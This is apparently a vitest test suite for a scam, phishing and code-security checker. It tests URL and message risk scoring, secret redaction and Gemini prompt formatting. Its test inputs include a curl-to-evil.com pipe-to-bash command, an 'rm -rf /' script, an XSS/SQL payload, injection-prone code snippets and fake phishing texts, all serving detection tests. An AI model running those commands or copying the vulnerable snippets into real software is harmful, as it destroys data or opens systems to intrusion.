import { describe, it, expect } from 'vitest';
import {
  SafetyInputType,
  AnalyzerType,
  RiskLevel,
  ConfidenceLevel,
  Finding,
} from './types';
import { InputClassifier } from './analyzers/input-classifier';
import { RiskEngine } from './risk-engine';
import { SafetyService } from './service';
import { redactUrl, redactSensitiveText, redactDataRecord } from './redaction';

describe('Phase 4.7: Safety Checkup MVP Test Suite', () => {

  // =========================================================================
  // URL ANALYSIS TESTS (Cases 1 - 7)
  // =========================================================================

  it('1. https://example.com should not be HIGH merely because it is a URL', async () => {
    const report = await SafetyService.analyze({
      rawContent: 'https://example.com',
    });

    expect(report.inputType).toBe('url');
    expect(report.riskLevel).toBe('low');
    expect(report.score).toBeLessThanOrEqual(5);
    expect(report.findings.length).toBe(0);
    expect(report.recommendations[0].action).toBe('no_action_needed');
  });

  it('2. http://example.com should flag insecure protocol', async () => {
    const report = await SafetyService.analyze({
      rawContent: 'http://example.com',
    });

    expect(report.inputType).toBe('url');
    const insecureFinding = report.findings.find(f => f.type === 'insecure_protocol');
    expect(insecureFinding).toBeDefined();
    expect(insecureFinding?.severity).toBe('low');
    // Single weak signal remains low risk
    expect(report.riskLevel).toBe('low');
    expect(report.recommendations.some(r => r.action === 'use_https')).toBe(true);
  });

  it('3. https://paypal.com@evil.example/login should correctly identify evil.example as actual hostname', async () => {
    const report = await SafetyService.analyze({
      rawContent: 'https://paypal.com@evil.example/login',
    });

    expect(report.inputType).toBe('url');
    const hostConfusion = report.findings.find(f => f.type === 'host_confusion');
    expect(hostConfusion).toBeDefined();
    expect(hostConfusion?.description).toContain('evil.example');
    
    // Check evidence correctly identified actual host
    const urlEvidence = report.evidence.find(e => e.sourceType === 'url_analysis');
    expect(urlEvidence?.data?.hostname).toBe('evil.example');
    expect(report.riskLevel).toBe('high');
  });

  it('4. http://192.168.1.1/login should identify IP/private-network host appropriately without calling it malicious', async () => {
    const report = await SafetyService.analyze({
      rawContent: 'http://192.168.1.1/login',
    });

    expect(report.inputType).toBe('url');
    expect(report.findings.some(f => f.type === 'ip_as_host')).toBe(true);
    expect(report.findings.some(f => f.type === 'private_network_host')).toBe(true);
    // Not critical or falsely branded malicious
    expect(report.riskLevel).toBe('medium');
    expect(report.riskLevel).not.toBe('critical');
  });

  it('5. https://paypa1-security-login.example/verify should trigger lookalike + suspicious keyword signals', async () => {
    const report = await SafetyService.analyze({
      rawContent: 'https://paypa1-security-login.example/verify',
    });

    expect(report.inputType).toBe('url');
    const lookalike = report.findings.find(f => f.type === 'lookalike_brand');
    expect(lookalike).toBeDefined();
    expect(lookalike?.description).toContain('paypal');

    const suspiciousKw = report.findings.find(f => f.type === 'suspicious_keyword');
    expect(suspiciousKw).toBeDefined();
    expect(report.riskLevel).toBe('high');
  });

  it('6. https://bit.ly/example should detect shortened URL but not automatically classify HIGH', async () => {
    const report = await SafetyService.analyze({
      rawContent: 'https://bit.ly/example',
    });

    expect(report.inputType).toBe('url');
    const shortened = report.findings.find(f => f.type === 'shortened_url');
    expect(shortened).toBeDefined();
    // Shortened URL alone should NOT be HIGH
    expect(report.riskLevel).toBe('low');
    expect(report.riskLevel).not.toBe('high');
  });

  it('7. https://example.com/?password=hello must redact password value for stored analysis representation', async () => {
    const report = await SafetyService.analyze({
      rawContent: 'https://example.com/?password=hello',
    });

    const urlEvidence = report.evidence.find(e => e.sourceType === 'url_analysis');
    expect(urlEvidence).toBeDefined();
    const rawUrl = String(urlEvidence?.data?.rawUrl);
    expect(rawUrl).toContain('password=[REDACTED]');
    expect(rawUrl).not.toContain('hello');
  });

  // =========================================================================
  // MESSAGE ANALYSIS TESTS (Cases 8 - 12)
  // =========================================================================

  it('8. “Your account will be suspended today. Verify immediately.” should detect urgency/threat signals', async () => {
    const report = await SafetyService.analyze({
      rawContent: 'Your account will be suspended today. Verify immediately.',
    });

    expect(report.findings.some(f => f.type === 'threat_coercion')).toBe(true);
    expect(report.findings.some(f => f.type === 'urgency_language')).toBe(true);
  });

  it('9. “Send me the OTP you received.” should flag OTP request', async () => {
    const report = await SafetyService.analyze({
      rawContent: 'Send me the OTP you received.',
    });

    const otpFinding = report.findings.find(f => f.type === 'otp_request');
    expect(otpFinding).toBeDefined();
    expect(report.recommendations.some(r => r.action === 'do_not_share_otp')).toBe(true);
  });

  it('10. “My bank appointment is today.” should NOT become HIGH risk', async () => {
    const report = await SafetyService.analyze({
      rawContent: 'My bank appointment is today.',
    });

    expect(report.findings.length).toBe(0);
    expect(report.riskLevel).toBe('low');
    expect(report.score).toBe(0);
  });

  it('11. “Your bank account is suspended. Verify at http://suspicious-login.example and send your OTP.” should combine multiple signals into HIGH risk', async () => {
    const report = await SafetyService.analyze({
      rawContent: 'Your bank account is suspended. Verify at http://suspicious-login.example and send your OTP.',
    });

    expect(report.riskLevel).toBe('high');
    expect(report.findings.some(f => f.type === 'threat_coercion')).toBe(true);
    expect(report.findings.some(f => f.type === 'otp_request')).toBe(true);
    expect(report.findings.some(f => f.type === 'insecure_protocol')).toBe(true);
    expect(report.recommendations.some(r => r.action === 'do_not_share_otp')).toBe(true);
  });

  it('12. “Congratulations, claim your lottery prize after paying a processing fee.” should detect prize + financial request', async () => {
    const report = await SafetyService.analyze({
      rawContent: 'Congratulations, claim your lottery prize after paying a processing fee.',
    });

    expect(report.findings.some(f => f.type === 'prize_lure')).toBe(true);
    expect(report.findings.some(f => f.type === 'financial_request')).toBe(true);
    expect(report.recommendations.some(r => r.action === 'verify_financial_claim')).toBe(true);
  });

  // =========================================================================
  // INPUT CLASSIFIER TESTS (Cases 13 - 15)
  // =========================================================================

  it('13. Plain URL classified as URL', () => {
    expect(InputClassifier.classify({ rawContent: 'https://security-verify.example.org/path?token=123' })).toBe('url');
    expect(InputClassifier.classify({ rawContent: 'http://192.168.1.1' })).toBe('url');
  });

  it('14. JavaScript/Python-like code classified as code', () => {
    const jsCode = `function authenticateUser(req, res) {\n  const token = req.headers['authorization'];\n  return jwt.verify(token, 'secret');\n}`;
    expect(InputClassifier.classify({ rawContent: jsCode })).toBe('code');

    const pyCode = `def check_security(token):\n    import os\n    return os.getenv("SECRET_KEY") == token`;
    expect(InputClassifier.classify({ rawContent: pyCode })).toBe('code');
  });

  it('15. Scam-like paragraph classified as message', () => {
    const scamMsg = 'URGENT: Your bank account will be suspended today! Verify immediately at http://secure.example and send OTP.';
    expect(InputClassifier.classify({ rawContent: scamMsg })).toBe('message');
  });

  // =========================================================================
  // REDACTION & PRIVACY TESTS (Cases 16 - 18)
  // =========================================================================

  it('16. Password values are redacted', () => {
    const urlWithPassword = 'https://portal.example.com/login?username=alice&password=SuperSecretPassword123!';
    const redacted = redactUrl(urlWithPassword);
    expect(redacted).toContain('password=[REDACTED]');
    expect(redacted).not.toContain('SuperSecretPassword123!');

    const textWithPassword = 'My password is SuperSecretPassword123! please do not share';
    const redactedText = redactSensitiveText(textWithPassword);
    expect(redactedText).toContain('[REDACTED]');
    expect(redactedText).not.toContain('SuperSecretPassword123!');
  });

  it('17. OTP values are redacted', () => {
    const textWithOtp = 'Your verification code is 839201. Use it within 5 minutes.';
    const redactedText = redactSensitiveText(textWithOtp);
    expect(redactedText).toContain('[REDACTED]');
    expect(redactedText).not.toContain('839201');

    const otpMessage = 'Please enter OTP 481920 to confirm transaction';
    const redactedOtp = redactSensitiveText(otpMessage);
    expect(redactedOtp).toContain('[REDACTED]');
    expect(redactedOtp).not.toContain('481920');
  });

  it('18. Token query values are redacted in URLs and data records', () => {
    const urlWithToken = 'https://api.example.com/v1/data?token=ghp_ABC123XYZ4567890abcdef&session=sess_999888';
    const redactedUrl = redactUrl(urlWithToken);
    expect(redactedUrl).toContain('token=[REDACTED]');
    expect(redactedUrl).toContain('session=[REDACTED]');
    expect(redactedUrl).not.toContain('ghp_ABC123XYZ4567890abcdef');
    expect(redactedUrl).not.toContain('sess_999888');

    const record = {
      api_token: 'secret-token-value-99',
      hostname: 'example.com',
      auth: { bearer: 'token-abc' }
    };
    const sanitizedRecord = redactDataRecord(record);
    expect(sanitizedRecord.api_token).toBe('[REDACTED]');
    expect(sanitizedRecord.hostname).toBe('example.com');
  });

  // =========================================================================
  // RISK ENGINE CALIBRATION TESTS (Cases 19 - 21)
  // =========================================================================

  it('19. Single weak signal yields low risk', () => {
    const weakFinding: Finding = {
      id: 'f-weak',
      type: 'shortened_url',
      severity: 'low',
      title: 'Shortened Link',
      description: 'The link uses a shortening service.',
      confidence: 'medium',
    };

    const evaluation = RiskEngine.evaluate([weakFinding], [{
      analyzerId: 'url-analyzer',
      analyzerType: 'url',
      status: 'success',
      confidence: 'medium',
      findings: [weakFinding],
      evidence: [],
    }]);

    expect(evaluation.riskLevel).toBe('low');
    expect(evaluation.score).toBeLessThanOrEqual(10);
  });

  it('20. Multiple strong phishing signals yield high risk', () => {
    const findings: Finding[] = [
      {
        id: 'f-1',
        type: 'otp_request',
        severity: 'high',
        title: 'OTP Request',
        description: 'Requests one-time password.',
        confidence: 'high',
      },
      {
        id: 'f-2',
        type: 'threat_coercion',
        severity: 'medium',
        title: 'Threat / Account Suspension',
        description: 'Threatens immediate account closure.',
        confidence: 'medium',
      },
      {
        id: 'f-3',
        type: 'insecure_protocol',
        severity: 'low',
        title: 'Unencrypted Connection',
        description: 'HTTP protocol used.',
        confidence: 'high',
      },
    ];

    const evaluation = RiskEngine.evaluate(findings, [{
      analyzerId: 'message-scam-analyzer',
      analyzerType: 'scam',
      status: 'success',
      confidence: 'high',
      findings,
      evidence: [],
    }]);

    expect(evaluation.riskLevel).toBe('high');
    expect(evaluation.score).toBeGreaterThanOrEqual(30);
  });

  it('21. Critical risk remains rare and requires explicit severe combination or exposed secrets', () => {
    // A high-risk phishing message with OTP and urgency evaluates to HIGH, not critical
    const standardPhishingFindings: Finding[] = [
      {
        id: 'f-1',
        type: 'otp_request',
        severity: 'high',
        title: 'OTP Request',
        description: 'Requests OTP.',
        confidence: 'high',
      },
      {
        id: 'f-2',
        type: 'urgency_language',
        severity: 'low',
        title: 'Urgency',
        description: 'Urgent notice.',
        confidence: 'medium',
      },
    ];

    const evalPhishing = RiskEngine.evaluate(standardPhishingFindings, [{
      analyzerId: 'message-scam-analyzer',
      analyzerType: 'scam',
      status: 'success',
      confidence: 'high',
      findings: standardPhishingFindings,
      evidence: [],
    }]);

    expect(evalPhishing.riskLevel).toBe('high');
    expect(evalPhishing.riskLevel).not.toBe('critical');

    // Only critical severity finding (e.g. exposed secret in code) triggers critical
    const criticalSecretFinding: Finding = {
      id: 'f-crit',
      type: 'exposed_secret',
      severity: 'critical',
      title: 'Active API Secret Exposed',
      description: 'Found raw service secret in plaintext.',
      confidence: 'high',
    };

    const evalCrit = RiskEngine.evaluate([criticalSecretFinding], [{
      analyzerId: 'code-analyzer',
      analyzerType: 'code_security',
      status: 'success',
      confidence: 'high',
      findings: [criticalSecretFinding],
      evidence: [],
    }]);

    expect(evalCrit.riskLevel).toBe('critical');
  });

  // =========================================================================
  // GEMINI FALLBACK TEST (Case 22)
  // =========================================================================

  it('22. Deterministic safety result still renders if Gemini fails', async () => {
    const report = await SafetyService.analyze({
      rawContent: 'Your bank account is suspended. Verify at http://suspicious-login.example and send your OTP.',
      type: 'message',
    });

    const fallbackResponse = SafetyService.generateFallbackResponse(report);

    expect(fallbackResponse).toContain('### Safety Checkup Result');
    expect(fallbackResponse).toContain('**Risk Level**: HIGH');
    expect(fallbackResponse).toContain('#### Detected Indicators');
    expect(fallbackResponse).toContain('#### Recommended Actions');
    expect(fallbackResponse).toContain('#### Analysis Limitations');
    expect(fallbackResponse.length).toBeGreaterThan(100);
  });

  // =========================================================================
  // ARCHITECTURAL & BASELINE INTEGRITY
  // =========================================================================

  it('Validates supported safety input types and analyzers', () => {
    const validTypes: SafetyInputType[] = [
      'url', 'message', 'email', 'image', 'screenshot',
      'document', 'file', 'qr', 'website', 'code', 'claim', 'social_post'
    ];
    expect(validTypes.length).toBe(12);

    const validAnalyzers: AnalyzerType[] = [
      'url', 'phishing', 'spam', 'scam', 'domain', 'redirect', 'qr',
      'image_ai', 'image_manipulation', 'document', 'file', 'email',
      'message', 'claim', 'code_security', 'website'
    ];
    expect(validAnalyzers).toContain('url');
    expect(validAnalyzers).toContain('scam');
  });

  it('Decouples risk severity from assessment confidence', () => {
    const riskLevels: RiskLevel[] = ['low', 'medium', 'high', 'critical', 'unknown'];
    const confidenceLevels: ConfidenceLevel[] = ['low', 'medium', 'high'];

    expect(riskLevels).toContain('critical');
    expect(riskLevels).toContain('unknown');
    expect(confidenceLevels).not.toContain('critical');
  });

  it('Preserves uncertainty and documents limitations in all reports', async () => {
    const report = await SafetyService.analyze({
      rawContent: 'https://subdomain.example.xyz',
      type: 'url',
    });

    expect('is_safe' in report).toBe(false);
    expect('is_malicious' in report).toBe(false);
    expect(report.limitations.some(l => l.includes('Absence of flags is not an absolute guarantee'))).toBe(true);
  });

  it('Treats uploaded code strictly as data without executing it', async () => {
    const maliciousPayload = '<script>alert("xss")</script>; DROP TABLE users;';
    const report = await SafetyService.analyze({
      rawContent: maliciousPayload,
      filename: 'exploit.js',
    });

    expect(report.status).toBe('completed');
    expect(report.inputType).toBe('code');
  });

  it('Does not invoke or depend on Prophetic Medicine logic', async () => {
    const report = await SafetyService.analyze({
      rawContent: 'https://security-verify-login.top/account',
      type: 'url',
    });

    const jsonStr = JSON.stringify(report);
    expect(jsonStr).not.toContain('tibb-al-nabi');
    expect(jsonStr).not.toContain('hadith');
    expect(jsonStr).not.toContain('Ibn Qayyim');
  });

  it('Formats structured context for Gemini reasoning layer with clear safety instructions', async () => {
    const report = await SafetyService.analyze({
      rawContent: 'Urgent: Click here to claim your $10,000 lottery winnings!',
      type: 'message',
    });

    const geminiContext = SafetyService.formatForGemini(report);
    expect(geminiContext).toContain('[Safety Analysis Guidance Context]');
    expect(geminiContext).toContain('[Instructions for Assistant]');
    expect(geminiContext).toContain('Assessed Risk Level:');
    expect(geminiContext).toContain('Actionable Recommendations:');
    expect(geminiContext).toContain('ABSOLUTE SAFETY PROHIBITION: Never declare any URL, domain, message, or file as "100% safe"');
    expect(geminiContext).toContain('NO PLACEHOLDER CLAIMS');
    expect(geminiContext).toContain('ZERO SYSTEM LEAKAGE');
    expect(geminiContext).not.toContain('=== SAFETY & SECURITY DETERMINISTIC ANALYSIS ===');
  });

  // =========================================================================
  // SAFETY RESPONSE QUALITY: RECOVERY / SEED PHRASE TESTS
  // =========================================================================

  describe('Safety Response Quality: Recovery / Seed Phrase Detection', () => {
    it('1. Flags recovery phrase inquiry with support as HIGH risk', async () => {
      const report = await SafetyService.analyze({
        rawContent: 'Is it safe to share my recovery phrase with support if they ask?',
      });

      expect(report.inputType).toBe('message');
      expect(report.riskLevel).toBe('high');
      expect(report.confidenceLevel).toBe('high');
      const finding = report.findings.find(f => f.type === 'recovery_phrase_request');
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe('high');
      expect(report.recommendations.some(r => r.action === 'never_share_recovery_phrase')).toBe(true);
    });

    it('2. Flags third-party seed phrase solicitation as HIGH risk', async () => {
      const report = await SafetyService.analyze({
        rawContent: 'Support asked for my 12 word seed phrase',
      });

      expect(report.riskLevel).toBe('high');
      const finding = report.findings.find(f => f.type === 'recovery_phrase_request');
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe('high');
      expect(report.recommendations.some(r => r.action === 'never_share_recovery_phrase')).toBe(true);
    });

    it('3. Does NOT flag defensive user statement "Never share your recovery phrase with anyone"', async () => {
      const report = await SafetyService.analyze({
        rawContent: 'Never share your recovery phrase with anyone',
      });

      expect(report.riskLevel).toBe('low');
      const finding = report.findings.find(f => f.type === 'recovery_phrase_request');
      expect(finding).toBeUndefined();
    });

    it('4. Does NOT flag educational question "What is a recovery phrase and how does it work?"', async () => {
      const report = await SafetyService.analyze({
        rawContent: 'What is a recovery phrase and how does it work?',
      });

      expect(report.riskLevel).toBe('low');
      const finding = report.findings.find(f => f.type === 'recovery_phrase_request');
      expect(finding).toBeUndefined();
    });

    it('5. Does NOT flag legitimate security warning "Security alert: We will never ask for your recovery phrase"', async () => {
      const report = await SafetyService.analyze({
        rawContent: 'Security alert: We will never ask for your recovery phrase',
      });

      expect(report.riskLevel).toBe('low');
      const finding = report.findings.find(f => f.type === 'recovery_phrase_request');
      expect(finding).toBeUndefined();
    });

    it('6. Flags private key solicitation "Send your private key to claim airdrop" as HIGH risk', async () => {
      const report = await SafetyService.analyze({
        rawContent: 'Send your private key to claim airdrop',
      });

      expect(report.riskLevel).toBe('high');
      const finding = report.findings.find(f => f.type === 'recovery_phrase_request');
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe('high');
      expect(report.recommendations.some(r => r.action === 'never_share_recovery_phrase')).toBe(true);
    });

    it('7. Ordinary credential request remains HIGH risk credential_request', async () => {
      const report = await SafetyService.analyze({
        rawContent: 'Enter your password to verify your account',
      });

      expect(report.riskLevel).toBe('high');
      const finding = report.findings.find(f => f.type === 'credential_request');
      expect(finding).toBeDefined();
      expect(report.recommendations.some(r => r.action === 'do_not_enter_password')).toBe(true);
    });

    it('8. PayPal phishing URL remains HIGH risk', async () => {
      const report = await SafetyService.analyze({
        rawContent: 'http://paypal.com.account-update.temporary-banking-portal.xyz/login',
      });

      expect(report.inputType).toBe('url');
      expect(report.riskLevel).toBe('high');
      expect(report.findings.some(f => f.type === 'lookalike_brand' || f.type === 'suspicious_domain')).toBe(true);
      expect(report.findings.some(f => f.type === 'insecure_protocol')).toBe(true);
    });

    it('9. Redacts raw crypto private keys and seed phrase literals', () => {
      const rawHexKey = 'My private key is 0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce9c46f30d7d21715b23b1d and do not share';
      const sanitized = redactSensitiveText(rawHexKey);
      expect(sanitized).not.toContain('0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce9c46f30d7d21715b23b1d');
      expect(sanitized).toContain('[REDACTED_KEY]');

      const rawSeed = 'seed phrase: apple banana orange grape kiwi melon lemon lime berry peach plum cherry';
      const sanitizedSeed = redactSensitiveText(rawSeed);
      expect(sanitizedSeed).not.toContain('apple banana orange');
      expect(sanitizedSeed).toContain('[REDACTED]');
    });

    it('10. Wikipedia Computer_security URL does not trigger suspicious keyword finding solely from topic path', async () => {
      const report = await SafetyService.analyze({
        rawContent: 'https://en.wikipedia.org/wiki/Computer_security',
      });

      expect(report.inputType).toBe('url');
      expect(report.riskLevel).toBe('low');
      const keywordFinding = report.findings.find(f => f.type === 'suspicious_keyword');
      expect(keywordFinding).toBeUndefined();
    });

    it('11. Ordinary documentation /security paths do not receive suspicious keyword finding', async () => {
      const docReport = await SafetyService.analyze({
        rawContent: 'https://example.com/documentation/security',
      });
      expect(docReport.findings.find(f => f.type === 'suspicious_keyword')).toBeUndefined();

      const secReport = await SafetyService.analyze({
        rawContent: 'https://example.com/security',
      });
      expect(secReport.findings.find(f => f.type === 'suspicious_keyword')).toBeUndefined();
    });

    it('12. Genuine phishing URLs with login/account-update continue to trigger suspicious keyword and lookalike signals', async () => {
      const report = await SafetyService.analyze({
        rawContent: 'http://paypal.com.account-update.temporary-banking-portal.xyz/login',
      });

      expect(report.inputType).toBe('url');
      expect(report.riskLevel).toBe('high');
      const keywordFinding = report.findings.find(f => f.type === 'suspicious_keyword');
      expect(keywordFinding).toBeDefined();
      expect(keywordFinding?.metadata?.keywords).toContain('login');
      expect(report.findings.some(f => f.type === 'lookalike_domain' || f.type === 'lookalike_brand')).toBe(true);
    });

    it('13. Gemini formatting instructions enforce strict grounding without unsupported statistical claims', async () => {
      const report = await SafetyService.analyze({
        rawContent: 'https://example.com/login',
      });

      const formatted = SafetyService.formatForGemini(report);
      expect(formatted).toContain('STRICT EVIDENCE GROUNDING');
      expect(formatted).toContain('REPUTATION FIDELITY');
      expect(formatted).toContain('statistically common in fraudulent URLs');
      expect(formatted).toContain('security vendors confirmed this is safe');
    });

    it('14. Gemini formatting instructions enforce calibrated language without absolute organizational claims', async () => {
      const rawText = 'URGENT! Your SBI account will be blocked today. Verify your account immediately by clicking this link: https://paypa1-security-verification.xyz/login. Send the OTP you receive to complete verification.';
      const report = await SafetyService.analyze({ rawContent: rawText });

      // Risk classification and score are preserved strictly as CRITICAL
      expect(report.riskLevel).toBe('critical');
      expect(report.score).toBeGreaterThanOrEqual(50);

      const formatted = SafetyService.formatForGemini(report);
      expect(formatted).toContain('CALIBRATED RISK LANGUAGE & PROHIBITION OF ABSOLUTE ORGANIZATIONAL CLAIMS');
      expect(formatted).toContain('Banks generally do not ask customers to disclose OTPs through unsolicited messages');
      expect(formatted).toContain('strong phishing indicator');
      expect(formatted).toContain('Observed evidence in the message');
      expect(formatted).toContain('Reasonable security interpretation');
      expect(formatted).not.toContain('Legitimate organizations never request OTPs');
    });
  });

  // =========================================================================
  // PHASE 6.3: CODE & SCRIPT SECURITY INTELLIGENCE INTEGRATION TESTS
  // =========================================================================
  describe('Phase 6.3: Code & Script Security Intelligence Integration', () => {
    it('1. InputClassifier routes fenced code blocks, shebangs, terminal commands, and SQL to code', () => {
      // Fenced JavaScript
      expect(InputClassifier.classify({
        rawContent: '```javascript\nconsole.log(1);\n```',
      })).toBe('code');

      // Shebang script
      expect(InputClassifier.classify({
        rawContent: '#!/bin/bash\nrm -rf /',
      })).toBe('code');

      // Shell pipeline execution
      expect(InputClassifier.classify({
        rawContent: 'curl -sSL https://evil.com/setup.sh | bash',
      })).toBe('code');

      // SQL statement
      expect(InputClassifier.classify({
        rawContent: "SELECT * FROM users WHERE id = '",
      })).toBe('code');

      // Terminal package manager command
      expect(InputClassifier.classify({
        rawContent: 'npm install malicious-package',
      })).toBe('code');

      // PHP open tag
      expect(InputClassifier.classify({
        rawContent: '<?php echo "test"; ?>',
      })).toBe('code');

      // Go code
      expect(InputClassifier.classify({
        rawContent: 'package main\nfunc main() {}',
      })).toBe('code');

      // Valid JSON object
      expect(InputClassifier.classify({
        rawContent: '{"apiKey": "xyz123", "debug": true}',
      })).toBe('code');
    });

    it('2. InputClassifier preserves natural language and question queries as message', () => {
      expect(InputClassifier.classify({
        rawContent: 'How do I write a Python function?',
      })).toBe('message');

      expect(InputClassifier.classify({
        rawContent: 'Can you explain how SQL injection works in modern web applications?',
      })).toBe('message');

      expect(InputClassifier.classify({
        rawContent: 'What does the rm -rf command do?',
      })).toBe('message');

      expect(InputClassifier.classify({
        rawContent: 'Why is eval considered dangerous in JavaScript?',
      })).toBe('message');
    });

    it('3. End-to-end code security scan identifies exposed GitHub secret with immediate redaction', async () => {
      const codeSnippet = `
        import os
        GITHUB_TOKEN = "ghp_123456789012345678901234567890123456"
        def get_repos():
            pass
      `;

      const report = await SafetyService.analyze({
        rawContent: codeSnippet,
        filename: 'script.py',
      });

      expect(report.inputType).toBe('code');
      expect(report.riskLevel).toBe('critical');
      expect(report.score).toBeGreaterThanOrEqual(50);

      // Verify secret finding
      const secretFinding = report.findings.find(f => f.type === 'exposed_secret');
      expect(secretFinding).toBeDefined();
      expect(secretFinding?.description).toContain('[REDACTED_');
      expect(secretFinding?.description).not.toContain('ghp_123456789012345678901234567890123456');
      expect(secretFinding?.metadata?.secretClass).toBe('github_token');
      expect(secretFinding?.metadata?.lineNumber).toBeDefined();

      // Verify recommendation
      const rec = report.recommendations.find(r => r.action === 'rotate_exposed_secret');
      expect(rec).toBeDefined();
    });

    it('4. End-to-end code security scan identifies SQL injection with parameterized recommendation', async () => {
      const sqlSnippet = `
        const query = "SELECT * FROM users WHERE email = '" + req.body.email + "'";
        db.query(query);
      `;

      const report = await SafetyService.analyze({
        rawContent: sqlSnippet,
        filename: 'auth.js',
      });

      expect(report.inputType).toBe('code');
      expect(report.riskLevel).toBe('high');
      expect(report.score).toBeGreaterThanOrEqual(25);

      const sqlFinding = report.findings.find(f => f.type === 'sql_injection_pattern');
      expect(sqlFinding).toBeDefined();
      expect(sqlFinding?.severity).toBe('high');

      const rec = report.recommendations.find(r => r.action === 'use_parameterized_queries');
      expect(rec).toBeDefined();
    });

    it('5. End-to-end code security scan identifies command injection with avoid_shell_execution recommendation', async () => {
      const shellSnippet = `
        import os
        def backup(directory):
            os.system("tar -czf backup.tar.gz " + directory)
      `;

      const report = await SafetyService.analyze({
        rawContent: shellSnippet,
        filename: 'backup.py',
      });

      expect(report.inputType).toBe('code');
      expect(report.riskLevel).toBe('high');
      expect(report.score).toBeGreaterThanOrEqual(25);

      const cmdFinding = report.findings.find(f => f.type === 'command_injection_pattern');
      expect(cmdFinding).toBeDefined();

      const rec = report.recommendations.find(r => r.action === 'avoid_shell_execution');
      expect(rec).toBeDefined();
    });

    it('6. End-to-end code security scan identifies dynamic eval with avoid_dynamic_eval recommendation', async () => {
      const evalSnippet = `
        function calculate(expression) {
          return eval("Math." + expression);
        }
      `;

      const report = await SafetyService.analyze({
        rawContent: evalSnippet,
        filename: 'calc.ts',
      });

      expect(report.inputType).toBe('code');
      expect(report.riskLevel).toBe('high');
      expect(report.score).toBeGreaterThanOrEqual(25);

      const evalFinding = report.findings.find(f => f.type === 'dangerous_function');
      expect(evalFinding).toBeDefined();

      const rec = report.recommendations.find(r => r.action === 'avoid_dynamic_eval');
      expect(rec).toBeDefined();
    });

    it('7. Canonical contract: Multiple High-severity findings elevate overall risk to CRITICAL (score >= 50)', async () => {
      // Combines SQL injection (25 pts) + Command injection (25 pts) = 50 pts (CRITICAL)
      const combinedSnippet = `
        const sql = "SELECT * FROM records WHERE id = '" + userInput + "'";
        const child = child_process.exec("cat " + filePath);
      `;

      const report = await SafetyService.analyze({
        rawContent: combinedSnippet,
        filename: 'service.js',
      });

      expect(report.inputType).toBe('code');
      expect(report.score).toBeGreaterThanOrEqual(50);
      expect(report.riskLevel).toBe('critical');
    });

    it('8. Clean benign code evaluates to LOW risk (score 0) with medium confidence', async () => {
      const cleanSnippet = `
        export function addNumbers(a: number, b: number): number {
          return a + b;
        }
      `;

      const report = await SafetyService.analyze({
        rawContent: cleanSnippet,
        filename: 'math.ts',
      });

      expect(report.inputType).toBe('code');
      expect(report.riskLevel).toBe('low');
      expect(report.confidenceLevel).toBe('medium');
      expect(report.score).toBe(0);
      expect(report.findings.length).toBe(0);
      expect(report.recommendations[0].action).toBe('no_action_needed');
    });

    it('9. Gemini formatting instructions include Code & Script Security instructions with safe refactoring and secret protection', async () => {
      const codeSnippet = 'const token = "sk_live_123456789012345678901234"; eval(token);';
      const report = await SafetyService.analyze({
        rawContent: codeSnippet,
        filename: 'app.js',
      });

      const formatted = SafetyService.formatForGemini(report);
      expect(formatted).toContain('Input Classification: CODE');
      expect(formatted).toContain('CODE & SCRIPT SECURITY INSTRUCTIONS');
      expect(formatted).toContain('safe, hardened refactoring patterns');
      expect(formatted).toContain('SECRET PROTECTION');
      expect(formatted).toContain('NEVER unredact, reconstruct, or output sensitive credentials');
      expect(formatted).toContain('100% bug-free');
      expect(formatted).not.toContain('sk_live_123456789012345678901234');
    });

    it('10. Dedicated SafetyService.analyzeCode API executes directly and returns detailed code result', async () => {
      const res = await SafetyService.analyzeCode(
        'import os\nos.system("ping " + host)',
        'network.py'
      );

      expect(res.language).toBe('python');
      expect(res.riskLevel).toBe('high');
      expect(res.score).toBeGreaterThanOrEqual(25);
      expect(res.vulnerabilities.length).toBeGreaterThan(0);
      expect(res.characterCount).toBeGreaterThan(0);
    });
  });
});
